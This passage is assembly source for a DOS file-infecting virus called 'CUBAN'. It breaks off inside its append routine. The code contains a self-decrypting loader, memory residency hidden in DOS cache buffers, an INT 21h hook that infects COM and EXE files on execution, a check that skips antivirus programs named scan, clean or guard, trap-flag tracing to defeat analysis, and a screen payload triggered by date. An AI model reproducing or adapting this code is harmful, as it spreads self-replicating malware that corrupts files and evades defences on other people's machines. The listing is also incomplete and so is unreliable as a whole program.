
;=============================================================================
;==                                                                         ==
;==                               CUBAN                                     ==
;==      Created:   1-Jan-97                                                ==
;==  Last update:   3-Aug-98                                                ==
;==      Version:  1.0                                                      ==
;==                                                                         ==
;=============================================================================

LOCALS @@

MyFunc          equ     4B4Bh
IAC_Area        equ     4F8h ; Inter-Application Communication area 0:4F0-500
                             ;   use 3 bytes: pop bx ==> pop ax ==> iret
FstPSP_38       equ     48h  ; 10h bytes MCB + 38h
TempBuffer      equ     3400h; Temporary buffer in TVRAM for read & write file

Var             macro   ?Label, ?Addr
?Label          dw      ?Addr - offset Begin
endm

Code_Seg        segment
                assume  cs:Code_Seg, ds:Code_Seg
                org     100h

Start           proc    near
                pushf
                push    cs
                call    @@0
@@0:
                push    cx ds si
                mov     si,sp
                mov     si,ss:[si+6]
                mov     byte ptr cs:[si+@@2-@@0],0E2h
                jmp     $+2
                mov     si,cs
                db      81h, 0C6h ; add si,
                dw      12h       ; (offset Begin shr 4)
                mov     ds,si
                mov     si,0Eh    ; (offset Begin and 0Fh)
                mov     cx,VirSize/2
                push    ds si
@@1:
                db      81h, 34h, 0, 0    ; xor word ptr [si],0
                inc     si
                inc     si
@@2:
                db      0B4h, offset @@1-@@2-2 ; convert to loop @@1
                retf
Start           endp
;[]=========================================================================[]
Begin           proc    near
                push    ax bx     ; Please don't change these code
                mov     ax,sp     ; which use for recognize virus
                push    dx es di bp
                mov     bp,sp
                call    @@1
@@1:
                sub     word ptr [bp+12h],offset _Loader-Loader
                les     di,[bp+12h] ; ES:DI ==> Loader
; Compute offset
                push    cs
                pop     ds
                pop     si
                sub     si,offset @@1-Begin
                push    si        ; SI = offset Begin
                add     si,offset DataSave-Begin ; DS:SI ==> DataSave
                and     ax,0Fh
                add     si,ax
                mov     cx,LdrSize
                cld
                rep     movsb     ; Restore code

                mov     ah,30h
                int     21h
                xchg    ah,al
                cmp     ax,300h   ; DOS 3.0
                jbe     @@4

                mov     ah,52h
                int     21h
                les     di,es:[bx+12h] ; ES:DI ==> Pointer of cache buffer
                lds     si,es:[di]     ; DS:SI ==> Next cache buffer of list
                mov     bp,si
                mov     cx,100    ; Scan list of 100 cache buffers
                cld
                mov     bx,0FFFFh
                mov     dx,bx
@@2:
                lodsw             ; AX = offset Next cache buffer
                cmp     ax,dx
                jae     @@3
                mov     dx,ax
                cmp     dx,bx
                jae     @@3
                xchg    dx,bx     ; Minimum BX
@@3:
                xchg    ax,si     ; SI = offset New cache buffer
                cmp     si,bp     ; Is it lap over the list ?
                loopnz  @@2
                jcxz    @@4       ; In case DOS cache buffer > 100
                cmp     cl,90     ; Is it DOS cache buffer < 10 ?
                ja      @@4

                sub     dx,bx     ; DX = Size of cache buffer in byte
                mov     si,bx     ; DS:SI ==> 1st cache buffer
; Test previous 5 cache buffers for had virus been installed ?
                push    bx
                sub     bx,dx
                sub     bx,dx
                sub     bx,dx
                sub     bx,dx
                sub     bx,dx
                cmp     word ptr [bx],5350h ; Is it push ax bx code ?
                pop     bx
                jnz     @@6
@@4: ; Return
                push    cs
                pop     es
                call    @@5
@@5:
                pop     bx
                sub     bx,offset @@5-Begin
                call    DataRelocate   ; Relocate all data offset
                jmp     @@9
@@6: ; Install virus
;[]== Cut 5 cache buffers = 5 * 532 bytes = 2660 bytes ==[]
                call    CutBuffer ; Cut 1st cache buffer
                add     si,dx     ; SI ==> 2nd cache buffer
                call    CutBuffer ; Cut 2nd cache buffer
                add     si,dx
                call    CutBuffer ; Cut 3rd cache buffer
                add     si,dx
                call    CutBuffer ; Cut 4th cache buffer
                add     si,dx
                call    CutBuffer ; Cut 5th cache buffer
                add     si,dx
                xchg    ax,si     ; Actually mov ax,si but now only 1 byte
                stosw             ; Set first cache buffer

                push    bx
                push    ax
                mov     ah,52h
                int     21h
                pop     es:[bx-8] ; Set first cache buffer
                pop     bx

                push    ds
                pop     es
                mov     di,bx     ; ES:DI ==> Free cache buffer
                push    cs
                pop     ds
                pop     si        ; DS:SI ==> virus Begin
                push    si
                mov     cx,VirSize
                cld
                rep     movsb
                push    es
                lea     ax,bx[@@7-Begin]
                push    ax
ReturnFar:
                retf
@@7:
                call    DataRelocate   ; Relocate all data offset
                db      2Eh,89h,1Eh    ; mov cs:VirusOffset,bx
                Var ReOfs001,VirusOffset
                db      2Eh,8Ch,06h    ; mov cs:VirusSegment,es
                Var ReOfs002,VirusSegment
                int     11h
                and     al,30h
                cmp     al,30h
                mov     al,0B0h   ; Mono
                jz      @@8
                mov     al,0B8h   ; Color
@@8:
                db      0A2h      ; mov byte ptr ScrSeg[1],al
                Var ReOfs003,ScrSeg[1]
                call    SetInt21
                mov     ah,0
                int     1Ah
; There are 65543 ticks per hour so that the hiword (CX) same as system hour
                db      2Eh,89h,0Eh    ; mov cs:HourInstall,cx
                Var ReOfs004,HourInstall
@@9:
                call    GetXMSAddr
                pop     di
                pop     bp di es dx bx ax
                pop     si ds cx  ; push by Loader
                db      2Eh,80h,3Eh    ; cmp cs:MyFlag,1
                Var ReOfs005,MyFlag
                db      1
                jz      @@10
CommonReturn:
                push    bp ds
                jmp     TrapReturn
@@10:
                iret
Begin           endp
;[]===============[]
CutBuffer       proc    near
                push    si di
                mov     di,[si+2]
                mov     ax,[si]
                mov     [di],ax
                xchg    ax,si     ; Actually mov si,ax
                mov     [si+2],di
                pop     di si
                ret
CutBuffer       endp
;[]===============[]
SetInt21        proc    near
                mov     ah,52h
                int     21h
                mov     ax,es:[bx-2]
@@1:
                mov     ds,ax          ; DS ==> first MCB
                inc     ax
                cmp     ax,ds:[26h]    ; Is PSP:[16h] = PSP
                jz      @@2
                add     ax,ds:[3]
                jmp     @@1
@@2:
                push    ds
                pop     es
                mov     di,FstPSP_38
                push    cs
                pop     ds
                db      0BEh           ; mov si,offset Next21
                Var ReOfs006,Next21
                cld
                movsw
                movsw
                movsw

                mov     di,FstPSP_38+10
                mov     dx,di          ; DS:DX ==> Entry21
                mov     cx,Size_Entry21
                rep     movsb
                db      8Ch,06h        ; mov MCBFstPSP,es
                Var ReOfs007,MCBFstPSP
                push    es
                pop     ds
                mov     ax,3521h
                int     21h
                mov     [di],bx        ; Save Interrupt 21h
                mov     [di+2],es
                db      2Eh,89h,1Eh    ; mov cs:Ofs21,bx
                Var ReOfs008,Ofs21
                db      2Eh,8Ch,06h    ; mov cs:Seg21,es
                Var ReOfs009,Seg21
                mov     ah,25h
                int     21h
                ret
SetInt21        endp
;[]===============[]
DataRelocate    proc    near
                push    es
                pop     ds
                mov     dx,bx     ; BX ==> Begin
                sub     dx,bx[VirusOffset-Begin]
                lea     si,bx[RelocateTab-Begin]
                mov     cx,CountReOfs
@@1:
                lodsw
                sub     ax,offset Begin
                mov     di,bx
                add     di,ax
                add     cs:[di],dx
                loop    @@1
                ret
DataRelocate    endp
;[]===============[]
Next21:
                push    ax
                mov     ax,MyFunc
                jmp     CommonInt21+4
;[]===============[]
Entry21         proc    near
                cmp     ah,4Bh
                jb      @@1
CommonInt21:
                push    ax dx
                mov     ax,3300h
                int     21h       ; DL = Current break level
                pop     dx ax

                db      0EAh      ; Jmp MyInt21
                Var ReOfs010,MyInt21
VirusSegment    dw      ?

@@1:
                db      0EAh      ; Jump to origin interrupt 21h
Size_Entry21    equ     $-Entry21
Entry21         endp
;[]===============[]
SaveSS          dw      ?
Ofs01           dw      ?
Seg01           dw      ?
Ofs24           dw      ?
Seg24           dw      ?
MyFlag          db      1
OfsFName        dw      ?
SegFName        dw      ?

SubIP           dw      ?, ?
SaveEPB         dw      ?, ?

ExeHdr          dw      ?
PartPage        dw      ?
PageCount       dw      ?
                dw      ?
HdrSize         dw      ?
                dw      ?
                dw      ?
ReloSS          dw      ?
ExeSP           dw      ?

CodeSum         db      ?
RetryTab        db      18, 25, 50, 0
;[]===============[]
SaveLoadScr     proc    near
; If CF=CY=1 then SaveScreen otherwise LoadScreen
                push    es di
                db      2Eh,8Eh,1Eh    ; mov ds,cs:ScrSeg
                Var ReOfs011,ScrSeg
                mov     si,12*160+17*2 ; Line 13 Column 18
                push    ds
                pop     es
                mov     di,3000h  ; Temporary address
                jc      @@1
                xchg    si,di     ; Load Screen
@@1:
                mov     cx,Len_Copyr*2
                cld
                rep     movsb
                pop     di es
                ret
SaveLoadScr     endp
;[]===============[]
MyDemo          proc    near
                cld
                push    bx ds si
                stc               ; Save Screen
                call    SaveLoadScr
                push    cs
                pop     ds
                mov     ah,0Fh
                int     10h
                cmp     al,7
                jz      @@1
                cmp     al,3
                ja      @@7
@@1: ; Demo only for text mode
                mov     ah,3
                int     10h
                push    dx        ; Save cursor position

                mov     cx,48     ; Show 48 times
                mov     bl,0Ah    ; LightGreen on Black
@@2:
                push    cx
                db      0BEh      ; mov si,offset Copyright
                Var ReOfs012,Copyright
                mov     dx,12*100h+17  ; Line 13 Column 18
@@3:
                mov     cx,3      ; 3 characters have the same color
@@4:
                lodsb
                cmp     al,'$'
                jz      @@5
                push    ax
                mov     ah,2      ; Move cursor
                int     10h
                pop     ax
                push    cx
                mov     ah,9
                mov     cx,1
                int     10h
                pop     cx
                inc     dl
                loop    @@4

                inc     bl
                cmp     bl,0Fh    ; White on Black
                jbe     @@3
                mov     bl,0Ah    ; LightGreen on Black
                jmp     @@3
@@5:
                mov     ah,0
                int     1Ah
                mov     si,dx
@@6: ; Delay
                mov     ah,0
                int     1Ah
                cmp     si,dx
                jz      @@6
                pop     cx
                loop    @@2

                pop     dx        ; Load cursor postion
                mov     ah,2
                int     10h
                clc               ; Load Screen
                call    SaveLoadScr
@@7:
                pop     si ds bx
                ret
MyDemo          endp
;[]===============[]
MyInt21         proc    near
                pushf
                cmp     ax,MyFunc
                jnz     @@1
                jmp     @@12
@@1:
                popf
                cmp     ax,4B00h
                jz      @@6
                push    ax cx
                push    dx
                mov     ah,0
                int     1Ah
; Is it at least 1 hour after install virus ?
                db      81h,0F9h  ; cmp cx,HourInstall
HourInstall     dw      ?
                jz      @@4
                db      2Eh,89h,0Eh    ; mov cs:HourInstall,cx
                Var ReOfs013,HourInstall
                mov     ah,2Ah
                int     21h
; Is it after Sep/1995 ?
                cmp     cx,1995
                ja      @@2
                cmp     dh,9
                jb      @@4
@@2:
                db      80h,0FAh  ; cmp dl,DemoDay1
DemoDay1        db      11
                jz      @@3
                db      80h,0FAh  ; cmp dl,DemoDay2
DemoDay2        db      25
                jnz     @@4
@@3:
                call    MyDemo
@@4:
                pop     dx
@@5:
                pop     cx ax
                db      0EAh
Ofs21           dw      ?
Seg21           dw      ?
;[]== ========= ==[]
@@6: ; Scan file name executive
                push    ax cx

                push    es di
                push    ds
                pop     es
                mov     di,dx     ; ES:DI ==> FileName
                mov     cx,0FFh
                mov     al,'.'
                cld
                repne   scasb
                mov     ax,2020h
                                       ; in case 'COMMAND.COM'
                mov     cl,es:[di-5]   ; CL = 'm' or 'M'
                or      cl,al          ; Locase
                or      ax,es:[di-4]   ; ax='an'
                pop     di es

                cmp     ax,'na'        ; ????man?.*
                jnz     @@7
                cmp     cl,'m'
                jz      @@5
@@7:
                cmp     ax,'vc'        ; ?????cv?.*
                jz      @@5

                cmp     ax,'ac'        ; ????sca?.*   Ignore scan.*
                jnz     @@8
                cmp     cl,'s'
                jz      @@5
@@8:
                cmp     ax,'ae'        ; ????lea?.*   Ignore clean.*
                jnz     @@9
                cmp     cl,'l'
                jz      @@5
@@9:
                cmp     ax,'ra'        ; ????uar?.*   Ignore guard.*
                jnz     @@10
                cmp     cl,'u'
                jz      @@5
@@10:
                cmp     ax,'le'        ; ????iel?.*
                jnz     @@11
                cmp     cl,'i'
                jz      @@5
@@11:
                pop     cx ax

                push    bx cx dx ds si es di bp
                db      2Eh,0FFh,036h  ; push cs:SaveSS
                Var ReOfs014,SaveSS
                db      2Eh,0FFh,036h  ; push cs:SaveSP
                Var ReOfs015,SaveSP

                db      2Eh,8Ch,16h    ; mov cs:SaveSS,ss
                Var ReOfs016,SaveSS
                db      2Eh,89h,26h    ; mov cs:SaveSP,sp
                Var ReOfs017,SaveSP

                push    ds
                push    es
                pop     ds
                mov     si,bx
                push    cs
                pop     es
                db      0BFh      ; mov di,offset SaveEPB
                Var ReOfs018,SaveEPB
                mov     bx,di
                mov     cx,16h    ; Size of EPB
                cld
                rep     movsb     ; Save EPB
                pop     ds

                db      2Eh,89h,16h    ; mov cs:OfsFName,dx
                Var ReOfs019,OfsFName
                db      2Eh,8Ch,1Eh    ; mov cs:SegFName,ds
                Var ReOfs020,SegFName

                pushf
                db      0B8h           ; mov ax,MCBFstPSP
MCBFstPSP       dw      ?
                push    ax
                mov     ax,FstPSP_38
                push    ax             ; For IRET to Next21

                mov     ax,4B01h
                db      2Eh,0FFh,2Eh   ; jmp dword ptr cs:Ofs21 and then
                Var ReOfs021,Ofs21       ;   return far to Next21 --> @@12
;[]== ========= ==[]
@@12:
                popf
                pop     ax             ; PUSH AX at Next21
                jnc     FileDiag       ; RunFile Error ?

ExitProc: ; Program terminate will return here
                cli
                db      2Eh,8Eh,16h    ; mov ss,cs:SaveSS
                Var ReOfs022,SaveSS
                db      0BCh           ; mov sp,SaveSP
SaveSP          dw      ?
                sti
                db      2Eh,8Fh,06h    ; pop cs:SaveSP
                Var ReOfs023,SaveSP
                db      2Eh,8Fh,06h    ; pop cs:SaveSS
                Var ReOfs024,SaveSS

                pop     bp di es si ds dx cx bx
                retf    2
MyInt21         endp
;[]===============[]
FileDiag        proc    near
                push    cs
                pop     ds
                db      0BFh      ; mov di,offset SaveEPB
                Var ReOfs025,SaveEPB
                cli
                mov     ss,[di+10h]
                mov     sp,[di+0Eh]
                inc     sp
                inc     sp
                sti

                mov     ah,62h
                int     21h
                mov     es,bx     ; ES = PSP
                db      26h,0C7h,6,0Ah,0; mov es:[0Ah],offset ExitProc
                Var ReOfs026,ExitProc
                mov     es:[0Ch],cs

                pushf
                mov     ax,[di+14h]
                push    ax
                db      0A3h           ; mov SubIP[2],ax
                Var ReOfs027,SubIP[2]
                db      0A3h           ; mov SaveEPB[2],ax
                Var ReOfs028,SaveEPB[2]

                mov     ax,[di+12h]
                push    ax
                db      0A3h           ; mov SubIP,ax
                Var ReOfs029,SubIP
                db      0A3h           ; mov SaveEPB,ax
                Var ReOfs030,SaveEPB

                push    es
                les     di,[di+12h]
                cmp     word ptr es:[di-2],4252h ;???  'RB'
                jz      @@1
                cld
                mov     ah,0Fh
                int     10h
                cmp     al,3
                jbe     @@2
                cmp     al,7
                jz      @@2
@@1:
                jmp     @@11
@@2:
                cmp     bh,3
                jz      @@1
                call    SetInt24
                mov     ax,4301h  ; Set file attribute
                db      0C5h,16h  ; lds dx,dword ptr OfsFName
                Var ReOfs031,OfsFName
                mov     cx,20h    ; A+S-H-R-
                int     21h
                jnc     @@4
@@3:
                jmp     @@10
@@4:
                mov     ax,3D02h  ; OpenFile
                int     21h
                jc      @@3
                push    cs
                pop     ds
                db      0C7h,06h  ; mov FileDate,-1
                Var ReOfs032,FileDate
                dw      -1
                db      0A3h      ; mov FHandle,ax
                Var ReOfs033,FHandle

                xchg    ax,bx
                mov     cx,18
                db      0BAh      ; mov dx,offset ExeHdr
                Var ReOfs034,ExeHdr
                mov     si,dx
                call    ReadFile  ; Read 18 bytes to ExeHdr
                jc      @@5

                mov     ax,4202h
                xor     cx,cx
                cwd
                int     21h       ; Seek EOF
                cmp     dl,6      ; Is it FileSize < 6FFFF ?
                ja      @@5
                or      dx,dx     ; Is it FileSize > FFFF ?
                jnz     @@6
                cmp     ax,400h
                jae     @@6
@@5:
                jmp     @@9

@@6: ; FileSize in 400h .. 6FFFFh bytes
                db      0C7h,06h  ; mov SizeExeHdr,0
                Var ReOfs035,SizeExeHdr
                dw      0
                xchg    ax,bp
                lodsw
                cmp     ax,5A4Dh
                jz      @@7
                cmp     bp,64767-VirSize; Test FileCom
                ja      @@5
                jmp     @@8
@@7:
                db      0A1h      ; mov ax,HdrSize
                Var ReOfs036,HdrSize
                mov     cl,4
                shl     ax,cl
                db      0A3h      ; mov SizeExeHdr,ax
                Var ReOfs037,SizeExeHdr

                push    dx
                db      0A1h      ; mov ax,ReloSS
                Var ReOfs038,ReloSS
                mov     di,10h
                mul     di
                db      03h,06h   ; add ax,ExeSP
                Var ReOfs039,ExeSP
                adc     dx,0

                mov     bx,dx
                xchg    ax,cx
                mov     ax,bp
                pop     dx

                push    dx
                mov     di,512
                div     di
                inc     ax
                db      2Bh,06h   ; sub ax,PageCount
                Var ReOfs040,PageCount
                cmp     ax,100
                pop     dx
                ja      @@5

                db      2Bh,2Eh   ; sub bp,SizeExeHdr
                Var ReOfs041,SizeExeHdr
                sbb     dx,0

                sub     cx,bp
                sbb     bx,dx
                jc      @@8
                jnz     @@8
                jcxz    @@8

                cmp     cx,2710   ; ??????
                ja      @@8
                add     bp,cx
                adc     dx,bx
@@8:
                mov     ah,62h
                int     21h
                add     bx,10h
                xchg    ax,bp
                mov     si,10h
                div     si
                add     bx,ax

                db      89h,16h   ; mov OfsFName,dx
                Var ReOfs042,OfsFName
                db      89h,1Eh   ; mov SegFName,bx
                Var ReOfs043,SegFName
                db      0C6h,6    ; mov MyFlag,0
                Var ReOfs044,MyFlag
                db      0
                db      0C7h,6    ; mov CodeIndex,TempBuffer
                Var ReOfs045,CodeIndex
                dw      TempBuffer
                db      0C6h,6    ; mov Sca_or_StosW,0ABh
                Var ReOfs046,Sca_or_StosW
                db      0ABh      ; stosw
                db      0C6h,6    ; mov CodeSum,13
                Var ReOfs047,CodeSum
                db      13
                db      0C7h,6    ; mov RetryIndex,offset RetryTab
                Var ReOfs048,RetryIndex
                Var ReOfs049,RetryTab

                call    ResetInt24
                call    SetInt01
                call    GetXMSAddr
                call    ScanOrClear    ; Now clear
                call    SetTrapFlag
                pop     ds
                push    ds
                pop     es
                retf    2
@@9:
                call    SetFDate_Close
@@10:
                call    ResetInt24
@@11:
                pop     ds
                push    ds
                pop     es
                jmp     CommonReturn
FileDiag        endp
;[]===============[]
GetXMSAddr      proc    near
                db      2Eh,0C7h,6     ; mov cs:XMSAddr,offset ReturnFar
                Var ReOfs050,XMSAddr
                Var ReOfs051,ReturnFar
                db      2Eh,8Ch,0Eh    ; mov cs:XMSAddr[2],cs
                Var ReOfs052,XMSAddr[2]
                mov     ax,4300h
                int     2Fh
                cmp     al,80h         ; Test if XMS is installed
                jnz     @@1
                mov     ax,4310h
                int     2Fh
                db      2Eh,89h,1Eh    ; mov cs:XMSAddr,bx
                Var ReOfs053,XMSAddr
                db      2Eh,8Ch,6      ; mov cs:XMSAddr[2],es
                Var ReOfs054,XMSAddr[2]
@@1:
                ret
GetXMSAddr      endp
XMSAddr         dw      ?,?
;[]===============[]
ScanOrClear     proc    near
                push    ax cx es di
                db      2Eh,0C4h,3Eh   ; les di,dword ptr cs:OfsFName
                Var ReOfs055,OfsFName
                mov     ax,5248h  ; ???
                mov     cx,VirSize/2
                cld
                rep
Sca_or_StosW    label   byte
                stosw
                pop     di es cx ax
                ret
ScanOrClear     endp
;[]===============[]
SetFDate_Close  proc    near
                db      0B8h      ; mov ax,FileDate
FileDate        dw      ?
                inc     ax
                jz      CloseFile
                dec     ax
                xchg    ax,dx
                db      0B9h      ; mov cx,FileTime
FileTime        dw      ?
                mov     ax,5701h
                int     21h
CloseFile:
                push    ax
                mov     ah,3Eh
                db      0BBh      ; mov bx,FHandle
FHandle         dw      ?
                cmp     bl,5      ; Is it 5 pre-defined DOS handles ?
                jb      @@1
                int     21h
@@1:
                pop     ax
                ret
SetFDate_Close  endp
;[]===============[]
SetInt24        proc    near
                push    ax bx dx ds es
                mov     ax,3524h
                int     21h
                db      81h,0FBh       ; cmp bx,offset Entry24
                Var ReOfs056,Entry24
                jz      @@1
                push    cs
                pop     ds
                db      89h,1Eh        ; mov Ofs24,bx
                Var ReOfs057,Ofs24
                db      8Ch,6          ; mov Seg24,es
                Var ReOfs058,Seg24
                db      0BAh           ; mov dx,offset Entry24
                Var ReOfs059,Entry24
                mov     ah,25h
                int     21h
@@1:
                pop     es ds dx bx ax
                ret
SetInt24        endp
;[]===============[]
ResetInt24      proc    near
                push    ax dx ds
                mov     ax,2524h
                db      2Eh,0C5h,16h   ; lds dx,dword ptr cs:Ofs24
                Var ReOfs060,Ofs24
                int     21h
                pop     ds dx ax
                ret
ResetInt24      endp
;[]===============[]
Entry24:
                mov     al,3
                iret
;[]===============[]
Entry01         proc    far
                cli               ; Do not change this byte
                push    bp
                mov     bp,sp
                push    ds bx
                lds     bx,[bp+2] ; DS:BX ==> Last CS:IP
                cmp     word ptr [bx+4],5BCh; mov sp,??05h code
                jz      @@1
                cmp     word ptr [bx],0E9Ch  ; pushf & push cs code
                jnz     @@4
@@1:
                call    CloseFile
@@2:
                pop     bx
                and     byte ptr [bp+7],0FEh ; Clear Trapflag
                call    ResetInt01
                db      2Eh,80h,3Eh    ; cmp cs:MyFlag,1
                Var ReOfs061,MyFlag
                db      1
                jz      @@3
TrapReturn:
                xor     bp,bp
                mov     ds,bp
                mov     word ptr ds:IAC_Area,585Bh ; pop bx ax
                mov     byte ptr ds:IAC_Area[2],0CFh ; iret
                pop     ds bp

                push    ax bx
                db      2Eh,0FFh,36h   ; push cs:SegIAC
                Var ReOfs062,SegIAC
                db      2Eh,0FFh,36h   ; push cs:OfsIAC
                Var ReOfs063,OfsIAC

                mov     ah,6
                db      2Eh,0FFh,2Eh   ; jmp dword ptr cs:XMSAddr
                Var ReOfs064,XMSAddr
@@3:
                pop     ds bp
                iret
;[]== ========= ==[]
@@4:
                push    es di
                db      2Eh,08Bh,3Eh   ; mov di,cs:ScrSeg
                Var ReOfs065,ScrSeg
                mov     es,di
                db      0BFh           ; mov di,CodeIndex
CodeIndex       dw      ?
                mov     es:[di],bx
                mov     es:[di+2],ds
                mov     es:[di+4],sp
                db      2Eh,83h,6      ; add cs:CodeIndex,6
                Var ReOfs066,CodeIndex
                db      6
                pop     di es

                db      2Eh,0FEh,0Eh   ; dec cs:CodeSum
                Var ReOfs067,CodeSum
                jnz     @@7

                db      2Eh,0C6h,6     ; mov cs:Sca_or_StosW,0AFh
                Var ReOfs068,Sca_or_StosW
                db      0AFh           ; scasw
                call    ScanOrClear
                jnz     @@6
                db      2Eh,89h,1Eh    ; mov cs:SubIP,bx
                Var ReOfs069,SubIP
                db      2Eh,8Ch,1Eh    ; mov cs:SubIP[2],ds
                Var ReOfs070,SubIP[2]

                push    ax
                push    si
                db      0BEh      ; mov si,RetryIndex
RetryIndex      dw      ?
                mov     al,cs:[si]
                db      2Eh,0A2h  ; mov cs:CodeSum,al
                Var ReOfs071,CodeSum
                db      2Eh,0FFh,6; inc cs:RetryIndex
                Var ReOfs072,RetryIndex
                cmp     al,18
                jnz     @@5
                db      2Eh,89h,1Eh    ; mov cs:SaveEPB,bx
                Var ReOfs073,SaveEPB
                db      2Eh,8Ch,1Eh    ; mov cs:SaveEPB[2],ds
                Var ReOfs074,SaveEPB[2]
@@5:
                pop     si
                or      al,al
                pop     ax
                jz      @@6
                jmp     @@7
@@6:
                call    DoInfect
                jmp     @@2
@@7:
                or      byte ptr [bp+7],1   ; Set Trapflag
                mov     bx,[bx]   ; Get 2 bytes NextCode
                cmp     bl,0CDh   ; int
                jz      @@9
                cmp     bl,0F3h   ; repz
                jz      @@13
                cmp     bl,0F2h   ; repnz
                jz      @@13
@@8:
                pop     bx ds bp
                iret
;[]== ========= ==[]
@@9:
                cmp     bh,20h    ; int 20h
                jz      @@10
                cmp     bh,27h    ; int 27h
                jnz     @@11
@@10:
                jmp     @@1
@@11:
                cmp     bh,21h    ; int 21h
                jnz     @@12
                db      2Eh,0C6h,6; mov cs:MyFlag,1
                Var ReOfs075,MyFlag
                db      1
                cmp     ah,4Bh    ; Function Exec file
                jz      @@10
@@12:
                cmp     bh,10h    ; int 10h
                jnz     @@16
                or      ah,ah     ; Function Set Mode
                jnz     @@16
                jmp     @@6
;[]== ========= ==[]
@@13:
                cmp     bh,0A5h   ; movsw
                jz      @@14
                cmp     bh,0A4h   ; movsb
                jnz     @@15
@@14:
                db      2Eh,080h,3Eh   ; cmp cs:MyFlag,1
                Var ReOfs076,MyFlag
                db      1
                jnz     @@6
@@15:
                cmp     bh,3Eh    ; DS:
                jz      @@8
                cmp     bh,26h    ; ES:
                jz      @@8
                cmp     bh,2Eh    ; CS:
                jz      @@8
                cmp     bh,36h    ; SS:
                jz      @@8
@@16:
                db      2Eh,89h,1Eh    ; mov cs:@@18,bx
                Var ReOfs077,@@18
                jmp     $+2
                add     word ptr [bp+2],2
                and     byte ptr [bp+7],0FEh ; Clear Trapflag
                pop     bx ds bp

                db      2Eh,8Fh,6      ; pop cs:IP_Break
                Var ReOfs078,IP_Break
                db      2Eh,8Fh,6      ; pop cs:CS_Break
                Var ReOfs079,CS_Break

                db      2Eh,80h,3Eh    ; cmp cs:CodeSum,5
                Var ReOfs080,CodeSum
                db      5
                jae     @@17
                db      2Eh,0C6h,6     ; mov cs:CodeSum,5
                Var ReOfs081,CodeSum
                db      5
@@17:
                popf
@@18            label   word
                int     10h
                call    SetTrapFlag
                db      0EAh
IP_Break        dw      ?
CS_Break        dw      ?
SegIAC          dw      0
OfsIAC          dw      IAC_Area
Entry01         endp
;[]===============[]
SetTrapFlag     proc    near
                db      2Eh,0C6h,6; mov byte ptr cs:Entry01,0FAh
                Var ReOfs082,Entry01
                db      0FAh      ; cli
                push    ax
                pushf
                pop     ax
                or      ah,1      ; Set TrapFlag
                push    ax
                popf
                pop     ax
                ret
SetTrapFlag     endp
;[]===============[]
ClearTrapFlag   proc    near
                db      2Eh,0C6h,6; mov byte ptr cs:Entry01,0CFh
                Var ReOfs083,Entry01
                db      0CFh      ; iret
                push    ax
                pushf
                pop     ax
                and     ah,0FEh   ; Clear TrapFlag
                push    ax
                popf
                pop     ax
                ret
ClearTrapFlag   endp
;[]===============[]
SetInt01        proc    near
                push    ds es
                mov     ax,3501h
                int     21h
                push    cs
                pop     ds
                db      81h,0FBh       ; cmp bx,offset Entry01
                Var ReOfs084,Entry01
                jz      @@1
                db      89h,1Eh        ; mov Ofs01,bx
                Var ReOfs085,Ofs01
                db      8Ch,6          ; mov Seg01,es
                Var ReOfs086,Seg01
@@1:
                mov     ah,25h
                db      0BAh           ; mov dx,offset Entry01
                Var ReOfs087,Entry01
                int     21h
                pop     es ds
                ret
SetInt01        endp
;[]===============[]
ResetInt01      proc    near
                push    ax dx ds
                call    ClearTrapFlag
                mov     ax,2501h
                db      2Eh,0C5h,16h   ; lds dx,dword ptr cs:Ofs01
                Var ReOfs088,Ofs01
                int     21h
                pop     ds dx ax
                ret
ResetInt01      endp
;[]===============[]
SeekLoader      proc    near
                mov     ah,62h
                int     21h
                mov     ax,es
                sub     ax,bx
                jc      @@1
                mov     bx,10h
                mul     bx
                add     ax,di
                adc     dx,0
                sub     ax,100h
                sbb     dx,0
                db      5         ; add ax,SizeExeHdr
SizeExeHdr      dw      ?
                adc     dx,0
                xchg    ax,dx
                xchg    ax,cx
;[]== ========= ==[]
SeekFile:
                push    cx dx
                mov     ax,4200h
                db      8Bh,1Eh        ; mov bx,FHandle
                Var ReOfs089,FHandle
                int     21h
                pop     dx cx
@@1:
                ret
SeekLoader      endp
;[]===============[]
TestFile        proc    near
                push    di
                call    SeekLoader
                jc      @@5
                push    ds
                mov     ax,es
                mov     dx,di
                add     dx,LdrSize
                db      8Eh,1Eh        ; mov ds,ScrSeg
                Var ReOfs090,ScrSeg
                mov     si,TempBuffer
@@1:
                cmp     [si],di
                jz      @@4
                jc      @@2
                cmp     [si],dx
                jae     @@2
                clc
                or      al,1
                jmp     @@3
@@2:
                add     si,6
                db      2Eh,3Bh,36h    ; cmp si,cs:CodeIndex
                Var ReOfs091,CodeIndex
                jnz     @@1
                stc
@@3:
                pop     ds
                jmp     @@5
@@4:
                cmp     [si+2],ax
                jnz     @@2
                mov     dx,[si+4] ; DX = Stack Pointer
                and     dx,0Fh
                pop     ds
                mov     cx,LdrSize
                db      81h,0C2h  ; add dx,offset DataSave
                Var ReOfs092,DataSave
                call    ReadFile  ; Read LdrSize bytes
                jc      @@5
                mov     si,dx
                mov     cx,LdrSize
                rep     cmpsb
                clc
@@5:
                pop     di
                ret
TestFile        endp
;[]===============[]
ReadFile        proc    near
                push    cx dx ds si es di
                push    ds dx cx
                db      2Eh,8Eh,1Eh    ; mov ds,cs:ScrSeg
                Var ReOfs093,ScrSeg
                mov     dx,TempBuffer
                mov     ah,3Fh
                int     21h
                pop     cx di es
                mov     si,dx
                cld
                rep     movsb
                pop     di es si ds dx cx
                ret
ReadFile        endp
;[]===============[]
WriteFile       proc    near
                push    dx ds si es di
                mov     si,dx
                db      0B8h
ScrSeg          dw      0B800h    ; mov ax,ScrSeg
                mov     es,ax
                mov     di,TempBuffer
                mov     dx,di
                push    cx
                cld
                rep     movsb
                pop     cx
                push    es
                pop     ds
                mov     ah,40h
                int     21h
                pop     di es si ds dx
                ret
WriteFile       endp
;[]===============[]
FixExeSize      proc    near
                mov     ax,4202h
                xor     cx,cx
                cwd
                int     21h
                mov     si,512
                div     si
                inc     ax
                db      89h,16h        ; mov PartPage,dx
                Var ReOfs094,PartPage
                db      0A3h           ; mov PageCount,ax
                Var ReOfs095,PageCount
                xor     cx,cx
                mov     dx,2
                call    SeekFile
                mov     cx,4
                db      0BAh           ; mov dx,offset PartPage
                Var ReOfs096,PartPage
                call    WriteFile
                ret
FixExeSize      endp
;[]===============[]
MergeLoader     proc    near
                call    SeekLoader
                jc      @@1
                mov     cx,LdrSize
                db      0BAh           ; mov dx,offset Loader
                Var ReOfs097,Loader
                call    WriteFile
@@1:
                ret
MergeLoader     endp
;[]===============[]
AppendVirus     proc    near
                push    ds es di
                mov     ah,2Ch
                int     21h
